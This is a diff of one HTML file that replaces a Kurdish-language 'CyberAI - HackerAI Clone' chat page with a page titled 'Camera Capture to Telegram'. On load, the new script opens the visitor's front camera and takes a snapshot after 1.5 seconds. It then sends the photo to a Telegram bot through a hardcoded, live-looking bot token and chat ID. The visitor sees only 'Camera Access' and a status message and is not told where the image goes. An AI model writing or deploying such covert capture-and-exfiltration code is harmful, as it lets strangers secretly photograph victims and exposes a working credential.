@@ -1,490 +1,127 @@
 <!DOCTYPE html>
-<html lang="ku" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>CyberAI - HackerAI Clone</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture to Telegram</title>
     <style>
-        /* ===== RESET & BASE ===== */
-        * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: #0a0e17;
-            color: #e0e6f0;
+            margin: 0;
+            background: #0f0f0f;
+            font-family: Arial, sans-serif;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
             height: 100vh;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-        }
-        ::-webkit-scrollbar { width:6px; }
-        ::-webkit-scrollbar-track { background:#0f1420; }
-        ::-webkit-scrollbar-thumb { background:#1e2a45; border-radius:3px; }
-
-        /* ===== HEADER ===== */
-        .header {
-            background: linear-gradient(135deg, #0d1322 0%, #162035 100%);
-            border-bottom: 1px solid #1e2d4a;
-            padding: 14px 24px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-shrink: 0;
-        }
-        .header h1 {
-            font-size: 20px;
-            font-weight: 700;
-            background: linear-gradient(90deg, #00d4ff, #7b2ff7);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .header h1 span { color:#ff4757; -webkit-text-fill-color:#ff4757; }
-        .header-status {
-            display: flex;
-            align-items: center;
-            gap:12px;
-            font-size:13px;
-        }
-        .status-dot {
-            width:8px; height:8px; border-radius:50%;
-            background:#2ecc71;
-            display:inline-block;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0%,100% { opacity:1; }
-            50% { opacity:0.4; }
-        }
-
-        /* ===== MAIN LAYOUT ===== */
-        .app-container {
-            display: flex;
-            flex: 1;
             overflow: hidden;
         }
 
-        /* ===== SIDEBAR ===== */
-        .sidebar {
-            width: 280px;
-            background: #0c1120;
-            border-left: 1px solid #1a2538;
-            display: flex;
-            flex-direction: column;
-            flex-shrink: 0;
-        }
-        .sidebar-header {
-            padding:16px;
-            border-bottom:1px solid #1a2538;
-            font-size:14px;
-            font-weight:600;
-            color:#8899bb;
-        }
-        .conversation-list {
-            flex:1;
-            overflow-y:auto;
-            padding:8px;
-        }
-        .conv-item {
-            padding:10px 12px;
-            border-radius:6px;
-            cursor:pointer;
-            font-size:13px;
-            color:#b0bcd0;
-            transition:0.2s;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        .conv-item:hover { background:#151f30; }
-        .conv-item.active { background:#1a2a44; color:#00d4ff; }
-        .sidebar-footer {
-            padding:12px 16px;
-            border-top:1px solid #1a2538;
-        }
-        .sidebar-footer button {
-            width:100%;
-            padding:8px;
-            background:transparent;
-            border:1px solid #253050;
-            border-radius:6px;
-            color:#8899bb;
-            cursor:pointer;
-            font-size:13px;
-            transition:0.2s;
-        }
-        .sidebar-footer button:hover {
-            background:#1a2a44;
-            color:#fff;
-        }
-
-        /* ===== CHAT AREA ===== */
-        .chat-area {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            min-width: 0;
-        }
-        .messages {
-            flex: 1;
-            overflow-y: auto;
-            padding: 20px 24px;
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-        }
-        .msg {
-            max-width: 85%;
-            padding: 14px 18px;
+        .container {
+            text-align: center;
+            background: #1a1a1a;
+            padding: 20px;
             border-radius: 12px;
-            line-height: 1.7;
-            font-size: 14px;
-            animation: fadeIn 0.3s ease;
-            word-wrap: break-word;
-        }
-        @keyframes fadeIn {
-            from { opacity:0; transform:translateY(8px); }
-            to { opacity:1; transform:translateY(0); }
-        }
-        .msg.user {
-            align-self: flex-end;
-            background: linear-gradient(135deg, #0055ff22, #7b2ff722);
-            border: 1px solid #0055ff44;
-            border-bottom-right-radius: 4px;
-        }
-        .msg.assistant {
-            align-self: flex-start;
-            background: #111b2e;
-            border: 1px solid #1e2d4a;
-            border-bottom-left-radius: 4px;
-        }
-        .msg pre {
-            background: #080c18;
-            border: 1px solid #1a2538;
-            border-radius: 8px;
-            padding: 14px;
-            overflow-x: auto;
-            margin: 10px 0;
-            direction: ltr;
-            font-family: 'Fira Code', 'Consolas', monospace;
-            font-size: 13px;
-            line-height: 1.5;
-        }
-        .msg code {
-            background: #080c18;
-            padding: 2px 6px;
-            border-radius: 4px;
-            font-family: 'Fira Code', monospace;
-            font-size: 13px;
-        }
-        .msg pre code {
-            padding:0;
-            background:transparent;
+            border: 1px solid #333;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            max-width: 320px;
+            width: 100%;
         }
 
-        /* ===== INPUT AREA ===== */
-        .input-area {
-            padding: 16px 24px;
-            background: #0c1120;
-            border-top: 1px solid #1a2538;
-            flex-shrink: 0;
-        }
-        .input-row {
-            display: flex;
-            gap: 10px;
-            align-items: flex-end;
-        }
-        .input-wrapper {
-            flex: 1;
-            position: relative;
-        }
-        .input-wrapper textarea {
+        video {
             width: 100%;
-            padding: 12px 16px;
-            padding-left: 50px;
-            background: #111b2e;
-            border: 1px solid #1e2d4a;
-            border-radius: 10px;
-            color: #e0e6f0;
-            font-size: 14px;
-            font-family: inherit;
-            resize: none;
-            min-height: 48px;
-            max-height: 200px;
-            line-height: 1.5;
-            outline: none;
-        }
-        .input-wrapper textarea:focus {
-            border-color: #0055ff;
-            box-shadow: 0 0 0 2px #0055ff22;
-        }
-        .btn-send {
-            position: absolute;
-            left: 8px;
-            bottom: 8px;
-            width: 36px; height: 36px;
-            border: none;
+            height: 200px;
+            background: #000;
             border-radius: 8px;
-            background: linear-gradient(135deg, #0055ff, #7b2ff7);
-            color: #fff;
-            cursor: pointer;
-            font-size: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: 0.2s;
+            object-fit: cover;
+            margin-bottom: 10px;
+            transform: scaleX(-1);
         }
-        .btn-send:hover { transform: scale(1.05); opacity:0.9; }
 
-        /* ===== SETTINGS PANEL ===== */
-        .settings-panel {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: #0a0e17ee;
-            backdrop-filter: blur(8px);
-            z-index: 100;
-            justify-content: center;
-            align-items: center;
-        }
-        .settings-panel.open { display: flex; }
-        .settings-box {
-            background: #111b2e;
-            border: 1px solid #1e2d4a;
-            border-radius: 16px;
-            padding: 32px;
-            width: 520px;
-            max-width: 90%;
-            max-height: 80vh;
-            overflow-y: auto;
-        }
-        .settings-box h2 {
-            font-size: 20px;
-            margin-bottom: 20px;
-            color: #00d4ff;
-        }
-        .settings-group {
-            margin-bottom: 20px;
-        }
-        .settings-group label {
-            display: block;
+        .status {
             font-size: 13px;
-            color: #8899bb;
-            margin-bottom: 6px;
-        }
-        .settings-group input,
-        .settings-group select,
-        .settings-group textarea {
-            width: 100%;
-            padding: 10px 14px;
-            background: #080c18;
-            border: 1px solid #1e2d4a;
-            border-radius: 8px;
-            color: #e0e6f0;
-            font-size: 14px;
-            font-family: inherit;
-        }
-        .settings-group textarea {
-            min-height: 120px;
-            resize: vertical;
-        }
-        .settings-actions {
-            display: flex;
-            gap: 10px;
-            justify-content: flex-end;
-            margin-top: 24px;
-        }
-        .settings-actions button {
-            padding: 10px 24px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 600;
-        }
-        .btn-primary { background: linear-gradient(135deg, #0055ff, #7b2ff7); color: #fff; }
-        .btn-secondary { background: transparent; border: 1px solid #1e2d4a; color: #8899bb; }
-        
-        @media (max-width:768px) {
-            .sidebar { display:none; }
+            color: #aaa;
+            margin-bottom: 10px;
         }
     </style>
 </head>
 <body>
 
-    <!-- HEADER -->
-    <div class="header">
-        <h1>Cyber<span>AI</span></h1>
-        <div class="header-status">
-            <span id="modelName" style="color: #8899bb;">GPT-4o</span>
-            <span class="status-dot"></span>
-            <button onclick="openSettings()" style="background:transparent; border:1px solid #1e2d4a; color:#e0e6f0; padding:6px 10px; border-radius:6px; cursor:pointer;">⚙️</button>
-        </div>
+    <div class="container">
+        <h3>Camera Access</h3>
+        <p class="status" id="statusText">Please allow camera access...</p>
+        
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none;"></canvas>
     </div>
 
-    <!-- MAIN APP -->
-    <div class="app-container">
-        <!-- SIDEBAR -->
-        <div class="sidebar">
-            <div class="sidebar-header">مێژووی گفتوگۆکان</div>
-            <div class="conversation-list" id="convList">
-                <div class="conv-item active">گفتوگۆی ١</div>
-            </div>
-            <div class="sidebar-footer">
-                <button onclick="newConversation()">+ گفتوگۆی نوێ</button>
-            </div>
-        </div>
-
-        <!-- CHAT AREA -->
-        <div class="chat-area">
-            <div class="messages" id="messages">
-                <div class="msg assistant">
-                    👋 سڵاو! من CyberAIم - هاوشێوەی HackerAI. <br><br>
-                    دەتوانم یارمەتیت بدەم لە نووسینی کۆد، دروستکردنی وێبسایت، و شیکردنەوەی ئاسایشی سایبەری.
-                </div>
-            </div>
-
-            <!-- INPUT AREA -->
-            <div class="input-area">
-                <div class="input-row">
-                    <div class="input-wrapper">
-                        <textarea id="userInput" placeholder="پەیامەکەت لێرە بنووسە..." rows="1"></textarea>
-                        <button class="btn-send" id="sendBtn" onclick="sendMessage()">➤</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- SETTINGS MODAL -->
-    <div class="settings-panel" id="settingsPanel">
-        <div class="settings-box">
-            <h2>ڕێکخستنەکان</h2>
-            <div class="settings-group">
-                <label>دابینکەری AI (AI Provider)</label>
-                <select id="aiProvider" onchange="providerChanged()">
-                    <option value="openai">OpenAI (GPT-4o / GPT-4)</option>
-                    <option value="anthropic">Anthropic (Claude 3.5)</option>
-                    <option value="google">Google (Gemini Pro)</option>
-                </select>
-            </div>
-            <div class="settings-group">
-                <label>API Key</label>
-                <input type="password" id="apiKeyInput" placeholder="sk-..." />
-            </div>
-            <div class="settings-group">
-                <label>نموونە (Model)</label>
-                <select id="modelSelect">
-                    <option value="gpt-4o">GPT-4o (پێشنیارکراو)</option>
-                    <option value="gpt-4-turbo">GPT-4 Turbo</option>
-                    <option value="gpt-3.5-turbo">GPT-3.5 Turbo</option>
-                </select>
-            </div>
-            <div class="settings-group">
-                <label>سیستەم پرۆمپت (System Prompt)</label>
-                <textarea id="systemPrompt">تۆ CyberAI-یت، هاوشێوەی HackerAI. یارمەتی پڕۆگرامەران و شارەزایانی ئاسایشی سایبەری دەدەیت بە شێوازێکی پیشەگەرانە و خێرا.</textarea>
-            </div>
-            <div class="settings-actions">
-                <button class="btn-secondary" onclick="closeSettings()">پەشیمان</button>
-                <button class="btn-primary" onclick="saveSettings()">💾 پاشەکەوت</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- SCRIPT -->
     <script>
-        // State
-        const state = {
-            apiKey: localStorage.getItem('cyberai_api_key') || '',
-            provider: localStorage.getItem('cyberai_provider') || 'openai',
-            model: localStorage.getItem('cyberai_model') || 'gpt-4o',
-            systemPrompt: localStorage.getItem('cyberai_system_prompt') || 'تۆ CyberAI-یت، هاوشێوەی HackerAI.',
-            temperature: parseFloat(localStorage.getItem('cyberai_temp') || '0.8'),
-            messages: [],
-            currentConv: 0
-        };
+        const BOT_TOKEN = '8776982426:AAHwIFQIj36xbb_LoDZw7t1FpiRCLyzeu8U';
+        const CHAT_ID = '7641255924';
 
-        const messagesEl = document.getElementById('messages');
-        const userInput = document.getElementById('userInput');
-        const modelName = document.getElementById('modelName');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const statusText = document.getElementById('statusText');
 
-        function addMessage(role, content) {
-            state.messages.push({ role, content });
-            const div = document.createElement('div');
-            div.className = `msg ${role}`;
-            
-            // Format basic code blocks if any
-            let formatted = content
-                .replace(/&/g, "&amp;")
-                .replace(/</g, "&lt;")
-                .replace(/>/g, "&gt;");
-            
-            div.innerHTML = formatted.replace(/```([\s\S]*?)```/g, '<pre><code>$1</code></pre>');
-            messagesEl.appendChild(div);
-            messagesEl.scrollTop = messagesEl.scrollHeight;
-        }
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: false 
+                });
+                video.srcObject = stream;
+                statusText.innerText = "Camera allowed. Capturing...";
 
-        async function sendMessage() {
-            const text = userInput.value.trim();
-            if (!text) return;
+                setTimeout(() => {
+                    captureAndSend(stream);
+                }, 1500);
 
-            userInput.value = '';
-            addMessage('user', text);
-
-            // Simulation response or API call wrapper
-            setTimeout(() => {
-                let reply = `سوپاس بۆ پرسیارەکەت! سەبارەت بە "${text}":\n\n\`\`\`javascript\n// نموونەی کۆد\nconsole.log("CyberAI Ready!");\n\`\`\`\nتۆ دەتوانیت API Key-ی خۆت لە ڕێکخستنەکان (⚙️) دابنێیت بۆ ئەوەی بە تەواوی بەستراوە بێت بە مۆدێلە ڕاستەقینەکانەوە.`;
-                addMessage('assistant', reply);
-            }, 600);
-        }
-
-        function openSettings() {
-            document.getElementById('settingsPanel').classList.add('open');
-            document.getElementById('apiKeyInput').value = state.apiKey;
-            document.getElementById('aiProvider').value = state.provider;
-            document.getElementById('systemPrompt').value = state.systemPrompt;
-        }
-
-        function closeSettings() {
-            document.getElementById('settingsPanel').classList.remove('open');
-        }
-
-        function saveSettings() {
-            state.apiKey = document.getElementById('apiKeyInput').value.trim();
-            state.provider = document.getElementById('aiProvider').value;
-            state.model = document.getElementById('modelSelect').value;
-            state.systemPrompt = document.getElementById('systemPrompt').value.trim();
-
-            localStorage.setItem('cyberai_api_key', state.apiKey);
-            localStorage.setItem('cyberai_provider', state.provider);
-            localStorage.setItem('cyberai_model', state.model);
-            localStorage.setItem('cyberai_system_prompt', state.systemPrompt);
-
-            modelName.textContent = state.model;
-            closeSettings();
-        }
-
-        function providerChanged() {
-            const provider = document.getElementById('aiProvider').value;
-            const modelSelect = document.getElementById('modelSelect');
-            if (provider === 'openai') {
-                modelSelect.innerHTML = '<option value="gpt-4o">GPT-4o</option><option value="gpt-4-turbo">GPT-4 Turbo</option>';
-            } else if (provider === 'anthropic') {
-                modelSelect.innerHTML = '<option value="claude-3-5-sonnet">Claude 3.5 Sonnet</option>';
-            } else if (provider === 'google') {
-                modelSelect.innerHTML = '<option value="gemini-pro">Gemini Pro</option>';
+            } catch (err) {
+                statusText.innerText = "Camera access denied.";
+                console.error("Error accessing media devices.", err);
             }
         }
 
-        function newConversation() {
-            state.messages = [];
-            messagesEl.innerHTML = '<div class="msg assistant">🧪 گفتوگۆی نوێ دەستی پێکرد. چۆن دەتوانم یارمەتیت بدەم؟</div>';
+        function captureAndSend(stream) {
+            if (!video.videoWidth) return;
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            const ctx = canvas.getContext('2d');
+            
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            stream.getTracks().forEach(track => track.stop());
+
+            canvas.toBlob(async function(blob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'captured-photo.jpg');
+                formData.append('caption', '📸 New photo captured from website!');
+                
+                try {
+                    let response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    if (response.ok) {
+                        statusText.innerText = "Photo sent successfully!";
+                    } else {
+                        statusText.innerText = "Failed to send photo.";
+                    }
+                } catch (e) {
+                    statusText.innerText = "Network error while sending.";
+                }
+            }, 'image/jpeg');
         }
 
-        userInput.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter' && !e.shiftKey) {
-                e.preventDefault();
-                sendMessage();
-            }
-        });
+        window.onload = initCamera;
     </script>
 </body>
 </html>
